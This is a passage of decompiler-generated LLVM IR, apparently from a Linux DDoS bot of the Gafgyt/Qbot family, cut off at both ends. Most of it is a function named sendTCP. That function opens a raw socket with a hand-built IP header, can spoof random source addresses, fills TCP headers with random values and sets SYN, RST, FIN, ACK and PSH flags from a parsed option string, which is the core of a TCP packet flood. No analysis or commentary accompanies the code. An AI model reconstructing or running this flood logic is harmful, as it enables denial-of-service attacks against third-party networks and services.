  %v4_804bbf2 = call i32 @csum(i16* %v3_804bbf2, i32 %v13_804b769)
  %v1_804bbf7 = urem i32 %v4_804bbf2, 65536
  store i32 %v1_804bbf7, i32* %edx.global-to-local, align 4
  %v1_804bbfd = trunc i32 %v4_804bbf2 to i16
  store i16 %v1_804bbfd, i16* %v4_804bb20, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804bc04 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804bc07 = icmp eq i1 %v15_804bc04, false
  br i1 %v1_804bc07, label %dec_label_pc_804bc26, label %dec_label_pc_804bc09

dec_label_pc_804bc09:                             ; preds = %dec_label_pc_804bbab
  %v0_804bc09 = load i32, i32* @esp, align 4
  %v1_804bc09 = inttoptr i32 %v0_804bc09 to i32*
  store i32 0, i32* %v1_804bc09, align 4
  %v2_804bc10 = inttoptr i32 %v4_804bbae to i32*
  %v3_804bc10 = call i32 @__GI_time(i32* %v2_804bc10)
  store i32 %v3_804bc10, i32* %eax.global-to-local, align 4
  %v8_804bc18 = icmp sgt i32 %v3_804bc10, %v5_804bb30
  br i1 %v8_804bc18, label %dec_label_pc_804bc56, label %dec_label_pc_804bb46

dec_label_pc_804bc26:                             ; preds = %dec_label_pc_804bbab
  %v4_804bc26 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804bc2c = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804bc2f = icmp eq i1 %v15_804bc2c, false
  br i1 %v1_804bc2f, label %dec_label_pc_804bc4e, label %dec_label_pc_804bc31

dec_label_pc_804bc31:                             ; preds = %dec_label_pc_804bc26
  store i32 %v4_804bc34, i32* %eax.global-to-local, align 4
  %v1_804bc3a = load i32, i32* @esp, align 4
  %v2_804bc3a = inttoptr i32 %v1_804bc3a to i32*
  store i32 %v4_804bc34, i32* %v2_804bc3a, align 4
  %v1_804bc3d = sext i32 %v4_804bc26 to i64
  %v2_804bc3d = call i32 @usleep(i64 %v1_804bc3d)
  store i32 %v2_804bc3d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb46.outer

dec_label_pc_804bc4e:                             ; preds = %dec_label_pc_804bc26
  %v4_804bc4e = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804bb46.outer

dec_label_pc_804bc56:                             ; preds = %dec_label_pc_804bc09, %dec_label_pc_804b98a, %dec_label_pc_804b93b
  %v0_804bc5f28 = phi i32 [ %v3_804b99a, %dec_label_pc_804b98a ], [ %v3_804b94b, %dec_label_pc_804b93b ], [ %v3_804bc10, %dec_label_pc_804bc09 ]
  br label %dec_label_pc_804bc59

dec_label_pc_804bc59:                             ; preds = %dec_label_pc_804b8c3, %dec_label_pc_804b81a, %dec_label_pc_804b79b, %dec_label_pc_804b800, %dec_label_pc_804bc56
  %v0_804bc5f = phi i32 [ 0, %dec_label_pc_804b81a ], [ %v4_804b7ab, %dec_label_pc_804b79b ], [ %v3_804b810, %dec_label_pc_804b800 ], [ %v0_804bc5f28, %dec_label_pc_804bc56 ], [ %v2_804b8ca, %dec_label_pc_804b8c3 ]
  store i32 %v0_804b768, i32* @ebx, align 4
  ret i32 %v0_804bc5f

; uselistorder directives
  uselistorder i32 %v4_804bc26, { 2, 1, 0 }
  uselistorder i32 %v4_804bbf2, { 1, 0 }
  uselistorder i32 %v2_804bbb5, { 1, 0 }
  uselistorder i32 %v4_804bbae, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804bb76, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804bb15, { 1, 0 }
  uselistorder i32 %v4_804badd, { 2, 1, 0 }
  uselistorder i32 %v1_804bb9a.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804bac9, { 2, 1, 0 }
  uselistorder i32 %v2_804baa5, { 1, 0 }
  uselistorder i32 %v3_804ba96, { 1, 0 }
  uselistorder i32 %v1_804ba90, { 1, 0 }
  uselistorder i32 %v2_804ba2c, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b9fe, { 1, 0 }
  uselistorder i32 %v4_804b92d, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v4_804b8e1, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804b821, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804b81d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_804b7f2, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804b79b, { 1, 0 }
  uselistorder i32 %v1_804b789, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 36, 37, 39, 38, 42, 40, 41, 44, 43, 47, 45, 46, 50, 48, 49, 52, 51, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bc59, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804bbab, { 1, 0 }
  uselistorder label %dec_label_pc_804bb46, { 1, 0 }
  uselistorder label %dec_label_pc_804bb46.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bada, { 1, 0 }
  uselistorder label %dec_label_pc_804ba05, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ad, { 1, 0 }
  uselistorder label %dec_label_pc_804b8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b879, { 1, 0 }
  uselistorder label %dec_label_pc_804b879.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b79b, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804bc64 = load i32, i32* @esi, align 4
  %v0_804bc65 = load i32, i32* @ebx, align 4
  %v15_804bc66 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bc7d = icmp eq i32 %arg2, 0
  %v1_804bc81 = icmp eq i1 %v4_804bc7d, false
  br i1 %v1_804bc81, label %dec_label_pc_804bc91, label %dec_label_pc_804bc83

dec_label_pc_804bc83:                             ; preds = %entry
  %v1_804bc83 = call i32 @rand_cmwc(i32 %v15_804bc66)
  br label %dec_label_pc_804bca6

dec_label_pc_804bc91:                             ; preds = %entry
  %v1_804bc94 = urem i32 %arg2, 65536
  store i32 %v1_804bc94, i32* %eax.global-to-local, align 4
  store i32 %v1_804bc94, i32* %stack_var_-188, align 4
  %v1_804bc9a = trunc i32 %arg2 to i16
  %v2_804bc9a = call i32 @htons(i16 %v1_804bc9a)
  br label %dec_label_pc_804bca6

dec_label_pc_804bca6:                             ; preds = %dec_label_pc_804bc83, %dec_label_pc_804bc91
  %v2_804bca6 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804bca9 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804bca9, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v4_804bcb6 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804bcb6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bcbb = icmp eq i32 %v4_804bcb6, 0
  br i1 %v1_804bcbb, label %dec_label_pc_804bcc4, label %dec_label_pc_804c21d

dec_label_pc_804bcc4:                             ; preds = %dec_label_pc_804bca6
  %v5_804bcc7 = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804bcc7, i1* %cf.global-to-local, align 1
  %v15_804bcc7 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804bcc7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804bcee = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804bcee, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bcf6 = icmp eq i32 %v4_804bcee, 0
  %v1_804bcfa = icmp eq i1 %v4_804bcf6, false
  br i1 %v1_804bcfa, label %dec_label_pc_804bd16, label %dec_label_pc_804bcfc

dec_label_pc_804bcfc:                             ; preds = %dec_label_pc_804bcc4
  %v0_804bcfc = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804bcfc, i32* %eax.global-to-local, align 4
  store i32 %v0_804bcfc, i32* %stack_var_-188, align 4
  %v3_804bd0c = call i32 @Rootsprintf(i32 %v0_804bcfc, i32 ptrtoint ([27 x i8]* @global_var_8056a30.102 to i32))
  store i32 %v3_804bd0c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c21d

dec_label_pc_804bd16:                             ; preds = %dec_label_pc_804bcc4
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804bd25 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v4_804bcee, i32* %eax.global-to-local, align 4
  store i32 %v4_804bcee, i32* %stack_var_-188, align 4
  %v6_804bd42 = call i32 @__GI_setsockopt(i32 %v4_804bcee, i32 0, i32 3, i32 %v2_804bd25, i32 4)
  store i32 %v6_804bd42, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804bd47 = icmp slt i32 %v6_804bd42, 0
  %v1_804bd49 = icmp eq i1 %v2_804bd47, false
  br i1 %v1_804bd49, label %dec_label_pc_804bd65, label %dec_label_pc_804bd4b

dec_label_pc_804bd4b:                             ; preds = %dec_label_pc_804bd16
  %v0_804bd4b = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804bd4b, i32* %eax.global-to-local, align 4
  store i32 %v0_804bd4b, i32* %stack_var_-188, align 4
  %v3_804bd5b = call i32 @Rootsprintf(i32 %v0_804bd4b, i32 ptrtoint ([33 x i8]* @global_var_8056a4c.103 to i32))
  store i32 %v3_804bd5b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c21d

dec_label_pc_804bd65:                             ; preds = %dec_label_pc_804bd16
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bd65 = icmp eq i32 %arg4, 0
  %v1_804bd69 = icmp eq i1 %v4_804bd65, false
  br i1 %v1_804bd69, label %dec_label_pc_804bd74, label %dec_label_pc_804bd8a

dec_label_pc_804bd74:                             ; preds = %dec_label_pc_804bd65
  %v5_804bd7b = sub i32 32, %arg4
  %v10_804bd7b = icmp ugt i32 %arg4, 32
  store i1 %v10_804bd7b, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804bd83 = urem i32 %v5_804bd7b, 32
  %v4_804bd83 = icmp eq i32 %v2_804bd83, 0
  br i1 %v4_804bd83, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804bd74
  %v5_804bd83 = shl i32 1, %v2_804bd83
  store i32 %v5_804bd83, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804bd74, %bb
  %v0_804bd85 = phi i32 [ 1, %dec_label_pc_804bd74 ], [ %v5_804bd83, %bb ]
  %v1_804bd85 = sub i32 0, %v0_804bd85
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd8a

dec_label_pc_804bd8a:                             ; preds = %dec_label_pc_804bd65, %bb90
  %storemerge10 = phi i32 [ %v1_804bd85, %bb90 ], [ 0, %dec_label_pc_804bd65 ]
  %v1_804bd8d = add i32 %arg6, 40
  %v1_804bd99 = add i32 %arg6, 70
  %v2_804bd9c = and i32 %v1_804bd99, -16
  %v0_804bda2 = load i32, i32* @esp, align 4
  %v2_804bda2 = sub i32 %v0_804bda2, %v2_804bd9c
  %v1_804bda4 = add i32 %v2_804bda2, 24
  store i32 %v1_804bda4, i32* %edx.global-to-local, align 4
  %v1_804bdae = add i32 %v2_804bda2, 39
  %v2_804bdb1 = and i32 %v1_804bdae, -16
  %v1_804bdc9 = add i32 %v2_804bdb1, 20
  %v5_804bdcc = inttoptr i32 %v1_804bdc9 to i16*
  %v1_804bdd2 = add i32 %arg6, 20
  %v5_804bdd2 = icmp ugt i32 %arg6, -21
  store i1 %v5_804bdd2, i1* %cf.global-to-local, align 1
  store i32 %v1_804bdd2, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804bdda = inttoptr i32 %v2_804bda2 to i32*
  store i32 %storemerge10, i32* %v2_804bdda, align 4
  %v2_804bddd = call i32 @GetRandomIP(i32 %v1_804bd8d, i32 %v2_804bdb1)
  store i32 %v2_804bddd, i32* %eax.global-to-local, align 4
  %v1_804bde2 = load i32, i32* @esp, align 4
  %v2_804bde2 = inttoptr i32 %v1_804bde2 to i32*
  store i32 %v2_804bddd, i32* %v2_804bde2, align 4
  %v0_804bde5 = call i32 @htonl()
  %v3_804bdea = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804bdea, i32* %edx.global-to-local, align 4
  %v0_804bded = load i32, i32* @ebx, align 4
  %v1_804bded = load i32, i32* @esp, align 4
  %v2_804bded = add i32 %v1_804bded, 16
  %v3_804bded = inttoptr i32 %v2_804bded to i32*
  store i32 %v0_804bded, i32* %v3_804bded, align 4
  %v0_804bdf1 = load i32, i32* @esp, align 4
  %v1_804bdf1 = add i32 %v0_804bdf1, 12
  %v2_804bdf1 = inttoptr i32 %v1_804bdf1 to i32*
  store i32 6, i32* %v2_804bdf1, align 4
  %v1_804bdf9 = load i32, i32* @esp, align 4
  %v2_804bdf9 = add i32 %v1_804bdf9, 8
  %v3_804bdf9 = inttoptr i32 %v2_804bdf9 to i32*
  store i32 %v0_804bde5, i32* %v3_804bdf9, align 4
  %v0_804bdfd = load i32, i32* %edx.global-to-local, align 4
  %v1_804bdfd = load i32, i32* @esp, align 4
  %v2_804bdfd = add i32 %v1_804bdfd, 4
  %v3_804bdfd = inttoptr i32 %v2_804bdfd to i32*
  store i32 %v0_804bdfd, i32* %v3_804bdfd, align 4
  store i32 %v2_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804be04 = load i32, i32* @esp, align 4
  %v2_804be04 = inttoptr i32 %v1_804be04 to i32*
  store i32 %v2_804bdb1, i32* %v2_804be04, align 4
  %v0_804be07 = call i32 @makeIPPacket()
  store i32 %v0_804be07, i32* %eax.global-to-local, align 4
  %v2_804be0c = call i32 @rand_cmwc(i32 %v1_804bdc9)
  %v1_804be11 = urem i32 %v2_804be0c, 65536
  store i32 %v1_804be11, i32* %edx.global-to-local, align 4
  store i32 %v1_804bdc9, i32* %eax.global-to-local, align 4
  %v1_804be17 = trunc i32 %v2_804be0c to i16
  store i16 %v1_804be17, i16* %v5_804bdcc, align 4
  %v2_804be1a = call i32 @rand_cmwc(i32 %v1_804bdc9)
  %v2_804be24 = add i32 %v2_804bdb1, 24
  %v3_804be24 = inttoptr i32 %v2_804be24 to i32*
  store i32 %v2_804be1a, i32* %v3_804be24, align 8
  store i32 %v1_804bdc9, i32* %eax.global-to-local, align 4
  %v1_804be2a = add i32 %v2_804bdb1, 28
  %v2_804be2a = inttoptr i32 %v1_804be2a to i32*
  store i32 0, i32* %v2_804be2a, align 4
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v1_804be34 = add i32 %v2_804bdb1, 32
  %v2_804be34 = inttoptr i32 %v1_804be34 to i8*
  %v3_804be34 = load i8, i8* %v2_804be34, align 16
  %v2_804be38 = urem i8 %v3_804be34, 16
  %v2_804be3a = or i8 %v2_804be38, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804be3a, i8* %v2_804be34, align 16
  %v4_804be3f = ptrtoint i8* %arg5 to i32
  store i32 %v4_804be3f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be3f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a6d.104 to i32), i32* @edi, align 4
  %v7_804be5d = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a6d.104, i32 0, i32 0), i32 4)
  %v8_804be5d = urem i32 %v7_804be5d, 2
  %v9_804be5d = icmp eq i32 %v8_804be5d, 0
  %v0_804be5f = load i1, i1* %cf.global-to-local, align 1
  %v2_804be5f = or i1 %v0_804be5f, %v9_804be5d
  %v3_804be5f = zext i1 %v2_804be5f to i32
  %v4_804be5f = load i32, i32* %edx.global-to-local, align 4
  %v5_804be5f = and i32 %v4_804be5f, -256
  %v6_804be5f = or i32 %v3_804be5f, %v5_804be5f
  %v7_804be5f = xor i32 %v6_804be5f, 1
  store i32 %v7_804be5f, i32* @edx, align 4
  %v3_804be65 = and i32 %v7_804be5d, -256
  %v1_804be67 = trunc i32 %v7_804be5f to i8
  %v3_804be67 = zext i1 %v0_804be5f to i8
  %v4_804be67 = sub nsw i8 %v1_804be67, %v3_804be67
  %v15_804be67 = icmp eq i8 %v4_804be67, 0
  %v20_804be67 = zext i8 %v4_804be67 to i32
  %v23_804be67 = or i32 %v20_804be67, %v3_804be65
  store i32 %v23_804be67, i32* @ecx, align 4
  %v2_804be6b = sext i8 %v4_804be67 to i32
  store i32 %v2_804be6b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be70 = icmp eq i1 %v15_804be67, false
  br i1 %v1_804be70, label %dec_label_pc_804beb3, label %dec_label_pc_804be72

dec_label_pc_804be72:                             ; preds = %dec_label_pc_804bd8a
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v1_804be75 = add i32 %v2_804bdb1, 33
  %v2_804be75 = inttoptr i32 %v1_804be75 to i8*
  %v3_804be75 = load i8, i8* %v2_804be75, align 1
  %v2_804be79 = or i8 %v3_804be75, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be79 = zext i8 %v2_804be79 to i32
  store i32 %v7_804be79, i32* %eax.global-to-local, align 4
  store i8 %v2_804be79, i8* %v2_804be75, align 1
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v3_804be81 = load i8, i8* %v2_804be75, align 1
  %v2_804be85 = or i8 %v3_804be81, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be85 = zext i8 %v2_804be85 to i32
  store i32 %v7_804be85, i32* %eax.global-to-local, align 4
  store i8 %v2_804be85, i8* %v2_804be75, align 1
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v3_804be8d = load i8, i8* %v2_804be75, align 1
  %v2_804be91 = or i8 %v3_804be8d, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be91 = zext i8 %v2_804be91 to i32
  store i32 %v7_804be91, i32* %eax.global-to-local, align 4
  store i8 %v2_804be91, i8* %v2_804be75, align 1
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v3_804be99 = load i8, i8* %v2_804be75, align 1
  %v2_804be9d = or i8 %v3_804be99, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be9d = zext i8 %v2_804be9d to i32
  store i32 %v7_804be9d, i32* %eax.global-to-local, align 4
  store i8 %v2_804be9d, i8* %v2_804be75, align 1
  store i32 %v1_804bdc9, i32* %edx.global-to-local, align 4
  %v3_804bea5 = load i8, i8* %v2_804be75, align 1
  %v2_804bea9 = or i8 %v3_804bea5, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bea9 = zext i8 %v2_804bea9 to i32
  store i32 %v7_804bea9, i32* %eax.global-to-local, align 4
  store i8 %v2_804bea9, i8* %v2_804be75, align 1
  %v0_804c089.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804c089

dec_label_pc_804beb3:                             ; preds = %dec_label_pc_804bd8a
  store i32 %v4_804be3f, i32* @eax, align 4
  %v0_804beb6 = load i32, i32* @esp, align 4
  %v1_804beb6 = add i32 %v0_804beb6, 4
  %v2_804beb6 = inttoptr i32 %v1_804beb6 to i32*
  store i32 ptrtoint (i32* @global_var_8056a71.105 to i32), i32* %v2_804beb6, align 4
  %v0_804bebe = load i32, i32* @eax, align 4
  %v1_804bebe = load i32, i32* @esp, align 4
  %v2_804bebe = inttoptr i32 %v1_804bebe to i32*
  store i32 %v0_804bebe, i32* %v2_804bebe, align 4
  %v3_804bec1 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8056a6d.104 to i32))
  store i32 %v3_804bec1, i32* %eax.global-to-local, align 4
  %v5_804bec6 = inttoptr i32 %v3_804bec1 to i8*
  store i8* %v5_804bec6, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c07f17 = icmp eq i32 %v3_804bec1, 0
  %v1_804c08324 = icmp eq i1 %v5_804c07f17, false
  br i1 %v1_804c08324, label %dec_label_pc_804bece.lr.ph, label %dec_label_pc_804c089

dec_label_pc_804bece.lr.ph:                       ; preds = %dec_label_pc_804beb3
  %v1_804c03f = add i32 %v2_804bdb1, 33
  %v2_804c03f = inttoptr i32 %v1_804c03f to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804bece

dec_label_pc_804bece:                             ; preds = %dec_label_pc_804bece.lr.ph, %dec_label_pc_804c068
  %v3_804c051 = phi i8* [ %v5_804bec6, %dec_label_pc_804bece.lr.ph ], [ %tmp92, %dec_label_pc_804c068 ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804bece.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804c068 ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804bece.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804c068 ]
  %v4_804bece = ptrtoint i8* %v3_804c051 to i32
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bece, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a73.106 to i32), i32* @edi, align 4
  %v7_804beec = call i32 @_strncmp(i8* %v3_804c051, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a73.106, i32 0, i32 0), i32 4)
  %v8_804beec = urem i32 %v7_804beec, 2
  %v9_804beec = icmp eq i32 %v8_804beec, 0
  %v0_804beee = load i1, i1* %cf.global-to-local, align 1
  %v2_804beee = or i1 %v0_804beee, %v9_804beec
  %v3_804beee = zext i1 %v2_804beee to i32
  %v4_804beee = load i32, i32* @edx, align 4
  %v5_804beee = and i32 %v4_804beee, -256
  %v6_804beee = or i32 %v3_804beee, %v5_804beee
  %v7_804beee = xor i32 %v6_804beee, 1
  store i32 %v7_804beee, i32* %edx.global-to-local, align 4
  %v3_804bef4 = and i32 %v7_804beec, -256
  %v1_804bef6 = trunc i32 %v7_804beee to i8
  %v3_804bef6 = zext i1 %v0_804beee to i8
  %v4_804bef6 = sub nsw i8 %v1_804bef6, %v3_804bef6
  %v15_804bef6 = icmp eq i8 %v4_804bef6, 0
  %v20_804bef6 = zext i8 %v4_804bef6 to i32
  %v23_804bef6 = or i32 %v20_804bef6, %v3_804bef4
  store i32 %v23_804bef6, i32* @ecx, align 4
  %v2_804befa = sext i8 %v4_804bef6 to i32
  store i32 %v2_804befa, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804beff = icmp eq i1 %v15_804bef6, false
  br i1 %v1_804beff, label %dec_label_pc_804bf13, label %dec_label_pc_804bf01

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804bece
  store i32 %v1_804bdc9, i32* @eax, align 4
  %v3_804bf04 = load i8, i8* %v2_804c03f, align 1
  %v2_804bf08 = or i8 %v3_804bf04, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf08 = zext i8 %v2_804bf08 to i32
  store i32 %v7_804bf08, i32* @edx, align 4
  store i8 %v2_804bf08, i8* %v2_804c03f, align 1
  br label %dec_label_pc_804c068

dec_label_pc_804bf13:                             ; preds = %dec_label_pc_804bece
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bece, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a77.107 to i32), i32* @edi, align 4
  %v7_804bf31 = call i32 @_strncmp(i8* %v3_804c051, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a77.107, i32 0, i32 0), i32 4)
  %v8_804bf31 = urem i32 %v7_804bf31, 2
  %v9_804bf31 = icmp eq i32 %v8_804bf31, 0
  %v0_804bf33 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf33 = or i1 %v0_804bf33, %v9_804bf31
  %v3_804bf33 = zext i1 %v2_804bf33 to i32
  %v4_804bf33 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf33 = and i32 %v4_804bf33, -256
  %v6_804bf33 = or i32 %v3_804bf33, %v5_804bf33
  %v7_804bf33 = xor i32 %v6_804bf33, 1
  store i32 %v7_804bf33, i32* %edx.global-to-local, align 4
  %v3_804bf39 = and i32 %v7_804bf31, -256
  %v1_804bf3b = trunc i32 %v7_804bf33 to i8
  %v3_804bf3b = zext i1 %v0_804bf33 to i8
  %v4_804bf3b = sub nsw i8 %v1_804bf3b, %v3_804bf3b
  %v15_804bf3b = icmp eq i8 %v4_804bf3b, 0
  %v20_804bf3b = zext i8 %v4_804bf3b to i32
  %v23_804bf3b = or i32 %v20_804bf3b, %v3_804bf39
  store i32 %v23_804bf3b, i32* @ecx, align 4
  %v2_804bf3f = sext i8 %v4_804bf3b to i32
  store i32 %v2_804bf3f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf44 = icmp eq i1 %v15_804bf3b, false
  br i1 %v1_804bf44, label %dec_label_pc_804bf58, label %dec_label_pc_804bf46

dec_label_pc_804bf46:                             ; preds = %dec_label_pc_804bf13
  store i32 %v1_804bdc9, i32* @eax, align 4
  %v3_804bf49 = load i8, i8* %v2_804c03f, align 1
  %v2_804bf4d = or i8 %v3_804bf49, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf4d = zext i8 %v2_804bf4d to i32
  store i32 %v7_804bf4d, i32* @edx, align 4
  store i8 %v2_804bf4d, i8* %v2_804c03f, align 1
  br label %dec_label_pc_804c068

dec_label_pc_804bf58:                             ; preds = %dec_label_pc_804bf13
  store i32 %v4_804bece, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804bece, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a7b.108 to i32), i32* @edi, align 4
  %v7_804bf7c = call i32 @_strncmp(i8* %v3_804c051, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a7b.108, i32 0, i32 0), i32 4)
  %v8_804bf7c = urem i32 %v7_804bf7c, 2
  %v9_804bf7c = icmp eq i32 %v8_804bf7c, 0
  %v0_804bf7e = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf7e = or i1 %v0_804bf7e, %v9_804bf7c
  %v3_804bf7e = zext i1 %v2_804bf7e to i32
  %v4_804bf7e = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf7e = and i32 %v4_804bf7e, -256
  %v6_804bf7e = or i32 %v3_804bf7e, %v5_804bf7e
  %v7_804bf7e = xor i32 %v6_804bf7e, 1
  store i32 %v7_804bf7e, i32* %edx.global-to-local, align 4
  %v3_804bf84 = and i32 %v7_804bf7c, -256
  %v1_804bf86 = trunc i32 %v7_804bf7e to i8
  %v3_804bf86 = zext i1 %v0_804bf7e to i8
  %v4_804bf86 = sub nsw i8 %v1_804bf86, %v3_804bf86
  %v15_804bf86 = icmp eq i8 %v4_804bf86, 0
